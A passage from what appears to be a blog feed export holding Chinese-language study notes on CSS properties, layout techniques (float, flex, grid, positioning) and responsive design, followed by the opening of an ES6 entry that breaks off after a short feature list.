<li>linear-gradient(180deg, red 0, green 10%, yello 50%, black 100%), linear-gradient(45deg, red 0, green 10%, yello 50%, black 100%)</li>
</ul>
</li>
<li>背景图片<ul>
<li>red url(.&#x2F;test.png)</li>
<li>red url(data:image&#x2F;png;base64,…)</li>
</ul>
</li>
</ul>
<p>background-size: 背景大小，默认是平铺</p>
<p>background-attachment：背景图像是否固定或者随着页面的其余部分滚动。</p>
<p>background-color：设置元素的背景颜色。</p>
<p>background-image：把图像设置为背景。</p>
<p>background-position：设置背景图像的起始位置。</p>
<ul>
<li>center top</li>
</ul>
<p>background-repeat：设置背景图像是否及如何重复。</p>
<ul>
<li>norepeat</li>
<li>repeat-x</li>
</ul>
<h2 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h2><p>文字排版</p>
<ul>
<li>底线，底线：跟行高没关系</li>
<li>基线：默认按照此线对齐</li>
</ul>
<p>color：设置文本颜色</p>
<p>background: 背景颜色</p>
<ul>
<li>尺寸由字体决定，而不是line-box</li>
</ul>
<p>direction：设置文本方向。</p>
<p>letter-spacing：设置字符间距</p>
<p>line-height：设置行高</p>
<ul>
<li>行高由<code>line-box</code>决定</li>
<li>文字默认是垂直居中在<code>line-box</code>中</li>
</ul>
<p>text-align：对齐元素中的文本</p>
<p>text-decoration：向文本添加修饰</p>
<p>text-indent：缩进元素中文本的首行</p>
<p>text-shadow：设置文本阴影</p>
<p>text-transform：控制元素中的字母</p>
<p>unicode-bidi：设置或返回文本是否被重写 </p>
<p>vertical-align：设置元素的垂直对齐，依据底线，顶线，默认基于基线</p>
<ul>
<li>middle</li>
<li>top</li>
<li>10px</li>
</ul>
<p>white-space：设置元素中空白的处理方式</p>
<p>word-spacing：设置字间距</p>
<h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><p>字体族：</p>
<ul>
<li>衬线字体 serif：宋体</li>
<li>非衬线字体 sans-serif：黑体</li>
<li>等宽字体 monospace：monaco</li>
<li>手写体 cursive</li>
<li>花体 fantasy</li>
</ul>
<p>多字体 Fallback：尝试挨个使用字体</p>
<p>网络字体与自定义字体。</p>
<p>iconfont 字体图标。</p>
<p>属性值</p>
<p>font：在一个声明中设置所有的字体属性</p>
<p>font-family：指定文本的字体系列</p>
<ul>
<li>“字体用引号引起” 字体族不用引号</li>
<li>“Microsoft Yahei” serif</li>
<li>一般写不同平台下的字体</li>
<li>如果使用自定义字体，需要手动引入<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 定义字体 */</span></span><br><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">&quot;IF&quot;</span>;</span><br><span class="line">  <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&quot;./font.ttf&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.custom</span>&#123;</span><br><span class="line">  <span class="attribute">font-family</span>: IF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>font-size：指定文本的字体大小</p>
<p>font-style：指定文本的字体样式</p>
<p>font-variant：以小型大写字体或者正常字体显示文本。</p>
<p>font-weight：指定字体的粗细。</p>
<h2 id="边框"><a href="#边框" class="headerlink" title="边框"></a>边框</h2><p>border：简写属性，用于把针对四个边的属性设置在一个声明。</p>
<ul>
<li>大小 线形 颜色</li>
<li>边框背景图</li>
<li>边框衔接（三角形）</li>
</ul>
<p>border-style：用于设置元素所有边框的样式，或者单独地为各边设置边框样式。</p>
<ul>
<li>solid</li>
<li>dashed</li>
<li>dotted</li>
</ul>
<p>border-image：边框背景图</p>
<ul>
<li>url(…) 30px round; 角上 30px 保留，其余拉伸（重复）<ul>
<li>repeat</li>
<li>round</li>
</ul>
</li>
</ul>
<p>border-width：简写属性，用于为元素的所有边框设置宽度，或者单独地为各边边框设置宽度。</p>
<p>border-color：简写属性，设置元素的所有边框中可见部分的颜色，或为 4 个边分别设置颜色。</p>
<p>border-bottom：简写属性，用于把下边框的所有属性设置到一个声明中。</p>
<p>border-bottom-color：设置元素的下边框的颜色。</p>
<p>border-bottom-style：设置元素的下边框的样式。</p>
<p>border-bottom-width：设置元素的下边框的宽度。</p>
<h2 id="滚动与换行"><a href="#滚动与换行" class="headerlink" title="滚动与换行"></a>滚动与换行</h2><p>overflow</p>
<ul>
<li>visible - 超出</li>
<li>hidden - 超出隐藏</li>
<li>scroll - 滚动条显示</li>
<li>auto - 默认不显示滚动条</li>
</ul>
<p>滚动条样式</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">::-webkit-scrollbar&#123;</span><br><span class="line">  <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>overflow-wrap：是否换行</p>
<ul>
<li>break-word</li>
<li>normal</li>
<li>keep-all</li>
</ul>
<p>word-break：针对多字节文字</p>
<p>white-space：空白处断行</p>
<h2 id="margin"><a href="#margin" class="headerlink" title="margin"></a>margin</h2><p>margin：简写属性。在一个声明中设置所有外边距属性。<br>margin-bottom：设置元素的下外边距。<br>margin-left：设置元素的左外边距。<br>margin-right：设置元素的右外边距。<br>margin-top：设置元素的上外边距。</p>
<h2 id="padding"><a href="#padding" class="headerlink" title="padding"></a>padding</h2><p>padding：使用简写属性设置在一个声明中的所有填充属性<br>padding-bottom：设置元素的底部填充<br>padding-left：设置元素的左部填充<br>padding-right：设置元素的右部填充<br>padding-top：设置元素的顶部填充</p>
<h2 id="尺寸"><a href="#尺寸" class="headerlink" title="尺寸"></a>尺寸</h2><p>height：设置元素的高度。<br>line-height：设置行高。<br>max-height：设置元素的最大高度。<br>max-width：设置元素的最大宽度。<br>min-height：设置元素的最小高度。<br>min-width：设置元素的最小宽度。<br>width：设置元素的宽度。</p>
<h2 id="可见与形式"><a href="#可见与形式" class="headerlink" title="可见与形式"></a>可见与形式</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">h1</span><span class="selector-class">.hidden</span> &#123;<span class="attribute">visibility</span>:hidden;&#125;</span><br><span class="line"><span class="selector-tag">h1</span><span class="selector-class">.hidden</span> &#123;<span class="attribute">display</span>:none;&#125;</span><br><span class="line"><span class="selector-tag">li</span> &#123;<span class="attribute">display</span>:inline;&#125;</span><br><span class="line"><span class="selector-tag">span</span> &#123;<span class="attribute">display</span>:block;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span> &#123;<span class="attribute">color</span>:<span class="number">#000000</span>;&#125;      <span class="comment">/* 未访问链接*/</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">color</span>:<span class="number">#00FF00</span>;&#125;  <span class="comment">/* 已访问链接 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;<span class="attribute">color</span>:<span class="number">#FF00FF</span>;&#125;  <span class="comment">/* 鼠标移动到链接上 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span> &#123;<span class="attribute">color</span>:<span class="number">#0000FF</span>;&#125;  <span class="comment">/* 鼠标点击时 */</span></span><br></pre></td></tr></table></figure>

<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>list-style：简写属性。用于把所有用于列表的属性设置于一个声明中<br>list-style-image：将图象设置为列表项标志。<br>list-style-position：设置列表中列表项标志的位置。<br>list-style-type：设置列表项标志的类型。</p>
<h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">table</span>, <span class="selector-tag">th</span>, <span class="selector-tag">td</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line">    <span class="attribute">border-collapse</span>:collapse;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h1><p>bottom：定义了定位元素下外边距边界与其包含块下边界之间的偏移。<br>  auto<br>  length<br>  %<br>  inherit<br>clip：剪辑一个绝对定位的元素<br>  shape<br>  auto<br>  inherit<br>cursor：显示光标移动到指定的类型<br>  url<br>  auto<br>  crosshair<br>  default<br>  pointer<br>  move<br>  e-resize<br>  ne-resize<br>  nw-resize<br>  n-resize<br>  se-resize<br>  sw-resize<br>  s-resize<br>  w-resize<br>  text<br>  wait<br>  help<br>left：定义了定位元素左外边距边界与其包含块左边界之间的偏移。<br>  auto<br>  length<br>  %<br>  inherit<br>overflow：设置当元素的内容溢出其区域时发生的事情。<br>  auto<br>  hidden<br>  scroll<br>  visible<br>  inherit<br>overflow-y：指定如何处理顶部&#x2F;底部边缘的内容溢出元素的内容区域<br>  auto<br>  hidden<br>  scroll<br>  visible<br>  no-display<br>  no-content<br>overflow-x：指定如何处理右边&#x2F;左边边缘的内容溢出元素的内容区域<br>  auto<br>  hidden<br>  scroll<br>  visible<br>  no-display<br>  no-content<br>position：指定元素的定位类型<br>  absolute<br>  fixed<br>  relative<br>  static<br>  inherit<br>right：定义了定位元素右外边距边界与其包含块右边界之间的偏移。<br>  auto<br>  length<br>  %<br>  inherit<br>top：定义了一个定位元素的上外边距边界与其包含块上边界之间的偏移。<br>  auto<br>  length<br>  %<br>  inherit<br>z-index：设置元素的堆叠顺序：<br>  number<br>  auto<br>  inherit</p>
<h1 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h1><h2 id="transition"><a href="#transition" class="headerlink" title="transition"></a>transition</h2><p>主要用于属性值的平滑过渡。</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">  <span class="attribute">transition</span>: &lt;property-name&gt; &lt;time&gt; &lt;mode&gt;, &lt;property-name&gt; &lt;time&gt; &lt;mode&gt;, ...;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">  <span class="attribute">transition-property</span>: &lt;property-name&gt;;</span><br><span class="line">  <span class="attribute">transition-duration</span>: &lt;time&gt;;</span><br><span class="line">  <span class="attribute">transition</span>-function: &lt;mode&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mode</p>
<ul>
<li>ease</li>
<li>linear</li>
<li>ease-in</li>
<li>ease-out</li>
<li>ease-in-out</li>
</ul>
<p>例如</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">  <span class="attribute">transition</span>: color <span class="number">1s</span>;</span><br><span class="line">  &amp;<span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="comment">/*  */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>CSS 3D</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 首先设置场景</span></span><br><span class="line"><span class="selector-class">.area</span>&#123;</span><br><span class="line">  <span class="attribute">perspective</span>: <span class="number">800px</span>;  <span class="comment">// 距离物体的距离 像素</span></span><br><span class="line">  <span class="attribute">perspective-origin</span>: <span class="number">50%</span> <span class="number">50%</span>;  <span class="comment">// 视点 屏幕中间</span></span><br><span class="line">  <span class="comment">// 元素 transform3d 移动变换元素: translate, rotate</span></span><br><span class="line">  <span class="selector-tag">p</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate3d</span>(-<span class="number">30%</span>, <span class="number">30%</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate3d</span>(<span class="number">45deg</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="attribute">transform-origin</span>: ... // 调整旋转轴</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="animation"><a href="#animation" class="headerlink" title="animation"></a>animation</h2><p>主要用关键帧制作动画。</p>
<h1 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h1><h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p>table 布局</p>
<p>float + margin 布局</p>
<p>inline + block 布局</p>
<p>flex 布局</p>
<p>grid 布局</p>
<p>position</p>
<ul>
<li>static 按照文档流布局<ul>
<li>不可以使用 z-index</li>
</ul>
</li>
<li>relative 偏移本来的位置</li>
<li>absolute 相对父元素(也是absolute)的位置</li>
<li>fixed 相对屏幕</li>
</ul>
<p>默认方式，流式布局</p>
<ul>
<li>块元素会按垂直方向排列</li>
<li>内联元素一般从左向右排列</li>
</ul>
<p>当使用CSS时，布局就开始离开流式布局了。使用如下方式会离开流式布局：</p>
<ul>
<li>display</li>
<li>float</li>
<li>position</li>
<li>表格布局</li>
<li>多列布局</li>
</ul>
<h2 id="Display-属性"><a href="#Display-属性" class="headerlink" title="Display 属性"></a>Display 属性</h2><p>默认所有的元素都有<code>display</code>属性。例如<code>div</code>的<code>display</code>属性默认为<code>block</code>，<code>span</code>的<code>display</code>属性默认为<code>inline</code>。这个属性的取值有：</p>
<ul>
<li>block - 块元素</li>
<li>inline - 内联元素</li>
<li>inline-block - 内联元素，允许元素设置宽度和高度，表现为行内的块。</li>
<li>flex - 块元素，其子元素采用flex布局</li>
<li>grid - 块元素，其子元素采用grid布局</li>
</ul>
<h2 id="Position-定位技术"><a href="#Position-定位技术" class="headerlink" title="Position 定位技术"></a>Position 定位技术</h2><p>使用<code>position</code>会让元素脱离文档，固定在页面或屏幕的某一个位置。</p>
<ul>
<li>static - default 不脱离文档</li>
<li>relative - 相对于原来的位置做微调，会在文档流中占用空间</li>
<li>absolute - 相对于页面定位，脱离文档流</li>
<li>fixed - 相对于屏幕定位，脱离文档流</li>
<li>sticky - 相对于屏幕定位，直到到达它本该出现的位置，就恢复原来的定位</li>
</ul>
<p>同时需要配合如下属性使用</p>
<ul>
<li>left - 距离左边界</li>
<li>top - 距离上边界</li>
<li>right - 距离右边界</li>
<li>bottom - 距离下边界</li>
</ul>
<h2 id="浮动布局"><a href="#浮动布局" class="headerlink" title="浮动布局"></a>浮动布局</h2><p>浮动会脱离文档流，但是不会脱离文本流。</p>
<p>对自身的影响</p>
<ul>
<li>形成块</li>
<li>尽可能向上，向左，向右靠</li>
</ul>
<p>对父级的影响</p>
<ul>
<li>从布局上消失</li>
<li>造成高度塌陷</li>
</ul>
<p>清除浮动</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">img</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">float</span><span class="selector-pseudo">:right</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 清除浮动 */</span></span><br><span class="line"><span class="selector-class">.text_line</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">clear</span>:both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.clear-fix</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot; &quot;</span>;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">visibility</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当元素设置了float属性时，元素会脱离正常布局流，其他内容会环绕在该元素周围。该元素会浮动到父元素的左右两侧。<br>float</p>
<ul>
<li>left</li>
<li>right</li>
<li>none - default 不浮动</li>
<li>inherit - 继承父元素的float属性</li>
</ul>
<p>注意，当子元素设置了float属性时，由于子元素脱离了文档流，父元素会无法被子元素撑开。此时，就需要在父元素的最后加入一个元素来撑开父元素。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">使用 clear: both</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width: 50px; background: yellow&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;float: left&quot;</span>&gt;</span>content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">使用伪类，在元素内部的最后插入一个伪类元素</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.container</span><span class="selector-pseudo">:after</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">clear</span>: both;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">content</span>: <span class="string">&quot; &quot;</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">visibility</span>: hidden;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 50px; background: yellow&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;float: left&quot;</span>&gt;</span>content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">使用 overflow</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width: 50px; background: yellow; overflow: hidden&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;float: left&quot;</span>&gt;</span>content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>overflow</code>是当内容溢出时的处理策略，还可以对<code>overflow-x</code>，<code>overflow-y</code>单独设置。</p>
<ul>
<li>visible - default 溢出后的内容出现在父元素框外</li>
<li>hidden - 溢出部分被剪裁，父元素尺寸自适应</li>
<li>scroll - 显示滚动条，可以通过滚动条查看溢出部分</li>
<li>auto - 如果溢出，才显示滚动条</li>
<li>inherit - 继承父元素的属性</li>
</ul>
<h3 id="inline-block-布局"><a href="#inline-block-布局" class="headerlink" title="inline block 布局"></a>inline block 布局</h3><p>不用处理浮动，但是要处理间隙。</p>
<p>方式一，设置字体大小为<code>0</code></p>
<p>方式二，HTML中去除回车，空格之类的空白字符。</p>
<h2 id="Flex"><a href="#Flex" class="headerlink" title="Flex"></a>Flex</h2><p>每个盒子可以伸缩，且是并列的。也可以指定宽度。</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="selector-class">.item</span>&#123;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">1</span>; <span class="comment">// 占据的比例</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.fix-item</span>&#123;</span><br><span class="line">    <span class="attribute">flex</span>: none;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">50px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>轴向：</p>
<ul>
<li>main 主轴</li>
<li>cross 交叉轴</li>
</ul>
<p>属性</p>
<ul>
<li>flex-direction 主轴方向<ul>
<li>row</li>
<li>column</li>
<li>row-reverse</li>
</ul>
</li>
<li>flex-wrap 是否可以换行</li>
<li>justfy-content 主轴上的对齐方式<ul>
<li>flex-start</li>
<li>flex-end</li>
<li>center</li>
<li>space-between</li>
<li>space-around</li>
</ul>
</li>
<li>align-items 交叉轴上的对齐<ul>
<li>flex-start</li>
<li>flex-end</li>
<li>center</li>
<li>baseline</li>
<li>stretch</li>
</ul>
</li>
<li>align-content 多个轴的对齐方式</li>
</ul>
<p>子元素</p>
<ul>
<li>order 顺序</li>
<li>flex-grow 放大比例</li>
<li>flex-shrink 缩小比例</li>
<li>flex-basis 占据比例</li>
<li>flex 前三者的缩写</li>
<li>align-self 自己的对齐方式</li>
</ul>
<p>当父元素为<code>display: flex</code>布局时，<code>div</code>子元素将自动按列排序，也就是排成一行。父元素也可以通过设置属性来改变排列方向，以及子元素的高度是否拉伸到一致。</p>
<ul>
<li>flex-direction: <ul>
<li>row - default 横向排列</li>
<li>column</li>
<li>row-reverse</li>
<li>column-reverse</li>
</ul>
</li>
<li>flex-wrap: <ul>
<li>wrap - 允许换行</li>
<li>no-wrap</li>
</ul>
</li>
<li>flex-flow: <ul>
<li>row wrap - 合并写法</li>
</ul>
</li>
<li>align-items: <ul>
<li>stretch - default 拉伸到一致</li>
</ul>
</li>
</ul>
<p>同样，子元素也可以设置属性。</p>
<ul>
<li>flex: <ul>
<li>1 - 元素占的比例，此时行会被填满</li>
<li>200px - 元素宽度，如果是按行排列</li>
<li>1 200px - 设置最小200px的尺寸</li>
</ul>
</li>
</ul>
<h2 id="Grid-布局"><a href="#Grid-布局" class="headerlink" title="Grid 布局"></a>Grid 布局</h2><p>当父元素为<code>display: grid</code>布局时，<code>div</code>子元素将自动按顺序被填充到表格中。</p>
<ul>
<li>grid-template-columns: <ul>
<li>250px repeat(3, 1fr) - 第一列 250px，后三列 平分空间</li>
</ul>
</li>
<li>grid-template-rows:<ul>
<li>100px 100px - 两行，每行100px</li>
</ul>
</li>
<li>grid-gap <ul>
<li>10px - 行或列的间隔</li>
</ul>
</li>
</ul>
<p>子元素也可以根据需要跨行或跨列</p>
<ul>
<li>grid-column:<ul>
<li>2 - 在第二列显示</li>
<li>2 &#x2F; 4 - [2, 4) （从一开始）第二列开始，第四列之前结束</li>
</ul>
</li>
<li>grid-row:<ul>
<li>1 &#x2F; 3 - [1, 3) （从一开始）第一行开始，第三行之前结束</li>
</ul>
</li>
</ul>
<h2 id="响应式设计"><a href="#响应式设计" class="headerlink" title="响应式设计"></a>响应式设计</h2><p>考虑不同屏幕，鼠标，多点触屏。</p>
<p>设计之前考虑：</p>
<ul>
<li>哪些内容可以隐藏，点击弹出</li>
<li>何时折行</li>
<li>自适应空间</li>
</ul>
<p>方法</p>
<ul>
<li>rem</li>
<li>viewport</li>
<li>media query</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=320&quot;</span>/&gt;</span></span><br><span class="line">或使用脚本动态计算</span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> (<span class="attribute">max-width</span>: <span class="number">640px</span>) &#123;</span><br><span class="line">  <span class="selector-class">.left</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="移动设备"><a href="#移动设备" class="headerlink" title="移动设备"></a>移动设备</h1><p>在移动设备中，<code>1px</code>不等于设备的物理<code>1像素</code>，而是根据情况有多种取值可能。我们通常定义浏览器默认的尺寸<code>layout viewport</code>来表示一个页面的尺寸。对于移动设备访问PC端的页面，通常<code>layout viewport</code>会大于浏览器的<code>visual viewport</code>尺寸的，也就是会出现横向滚动条。为了解决移动设备上看到的内容（如字号大小）与PC端差不多，又定义了<code>ideal viewport</code>，这个尺寸因设备而异。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// layout viewport</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span></span><br><span class="line"><span class="comment">// visual viewport</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">innerWidth</span></span><br></pre></td></tr></table></figure>

<p>为了让移动设备默认使用<code>ideal viewport</code>而不是<code>layout viewport</code>来显示内容，就需要在页面头部加入如下内</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>为了能够让内容在不同的CSS尺寸下使用不同的布局，CSS还提供了设备查询功能，用于响应式布局。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">600px</span>) &#123;</span><br><span class="line">    <span class="selector-class">.box-c</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">        <span class="attribute">float</span>: left;</span><br><span class="line">        <span class="attribute">background</span>: yellow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">300px</span>) <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">600px</span>)&#123;</span><br><span class="line">    <span class="selector-class">.box-c</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">        <span class="attribute">float</span>: left;</span><br><span class="line">        <span class="attribute">background</span>: yellow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>依据尺寸动态加载CSS</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">media</span>=<span class="string">&quot;screen and (min-width:900px)&quot;</span> <span class="attr">href</span>=<span class="string">&quot;big.css&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">media</span>=<span class="string">&quot;screen and (max-width:600px)&quot;</span> <span class="attr">href</span>=<span class="string">&quot;small.css&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用Javascript编辑Media Query CSS</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Create a condition that targets viewports at least 768px wide</span></span><br><span class="line"><span class="keyword">const</span> mediaQuery = <span class="variable language_">window</span>.<span class="title function_">matchMedia</span>(<span class="string">&#x27;(min-width: 768px)&#x27;</span>)</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleTabletChange</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="comment">// Check if the media query is true</span></span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">matches</span>) &#123;</span><br><span class="line">    <span class="comment">// Then log the following message to the console</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Media Query Matched!&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Register event listener</span></span><br><span class="line">mediaQuery.<span class="title function_">addListener</span>(handleTabletChange)</span><br><span class="line"><span class="comment">// Initial check</span></span><br><span class="line"><span class="title function_">handleTabletChange</span>(mediaQuery)</span><br></pre></td></tr></table></figure>


<h1 id="单位"><a href="#单位" class="headerlink" title="单位"></a>单位</h1><p>绝对单位</p>
<ul>
<li>cm - 厘米</li>
<li>mm - 毫米</li>
<li>in - 英寸 96px</li>
<li>px - 像素</li>
<li>pt - 点</li>
</ul>
<p>相对单位</p>
<ul>
<li>em - 字体大小</li>
<li>ch - 相对于 0 的宽度</li>
<li>rem - 根元素的字体大小</li>
<li>vw - Viewport宽度的 1%</li>
<li>vh - Viewport高度的 1%</li>
<li>vmin - Viewport较小尺寸的 1%</li>
<li>vmax - Viewport较大尺寸的 1%</li>
<li>% - 相对于父元素</li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>ES6</title>
    <url>/2020/02/19/%E5%89%8D%E7%AB%AF/ES6/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><h2 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h2><p>IE7~11 基本不支持 ES6。</p>
<h2 id="ES-6"><a href="#ES-6" class="headerlink" title="ES 6"></a>ES 6</h2><ul>
<li>let const</li>
<li>箭头函数</li>
<li>模块化</li>
<li>Promise</li>
<li>面向对象</li>
<li>数组解构赋值</li>
